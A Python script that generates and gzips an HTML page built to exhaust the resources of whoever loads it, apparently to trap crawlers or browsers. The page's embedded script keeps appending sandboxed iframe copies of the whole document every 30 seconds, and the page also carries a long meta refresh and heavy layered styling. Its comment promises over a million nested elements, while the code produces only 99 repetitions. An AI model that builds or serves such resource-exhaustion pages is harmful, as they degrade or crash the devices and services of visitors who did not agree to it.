#!/usr/bin/env python3


def createHtml():
    # generates a webpage that tries to exhaust resources in a few different ways. the goal is to use more resources
    # the closer the requester is to a fully featured web browser.
    # 1. more than a million nested elements: if the requester tries to build a DOM from the html
    PREFIX = r'''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta http-equiv="refresh" content="9999">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="color-scheme" content="dark">
<meta name="theme-color" content="black">
<meta name="application-name" content="div">
<meta name="author" content="p">
<meta name="description" content="div">
<meta name="generator" content="p">
<meta name="keywords" content="div">
<meta name="creator" content="p">
<meta name="publisher" content="p">
<title>div</title>
<style>
html, body, div, p, iframe {
box-sizing: border-box;
height: 100%;
width: 100%;
position: absolute;
top: 0;
left: 0;
overflow: hidden;
padding: 0;
margin: 0;
border: 0;
background: radial-gradient(circle, rgba(0, 0, 0, 0.01) 90%, rgba(9, 9, 9, 0.01) 99%);
}
</style>
<script>
onload = () => {
const frame = document.createElement('iframe');
frame.sandbox = 'allow-scripts';
frame.srcdoc = `<!DOCTYPE html>\n` + document.documentElement.outerHTML;
setInterval(() => document.body.appendChild(frame.cloneNode(true)), 30000);
};
</script>
<body>
'''
    ELEM = r'<div><p>'
    elem_arr = [ELEM] * 99
    elem_str = ''.join(elem_arr)
    return PREFIX + elem_str


if __name__ == '__main__':
    print(createHtml())
    import os
    os.chdir(os.path.dirname(os.path.abspath(__file__)))

    with open('public/index.html', mode='wt', encoding='utf-8', newline='\n') as html_file:
        html_file.write(createHtml())
        html_file.flush()

    import subprocess
    subprocess.run(['gzip', '-f', '-n', '-v', '-k', '--best', 'public/index.html'], capture_output=True, check=True)
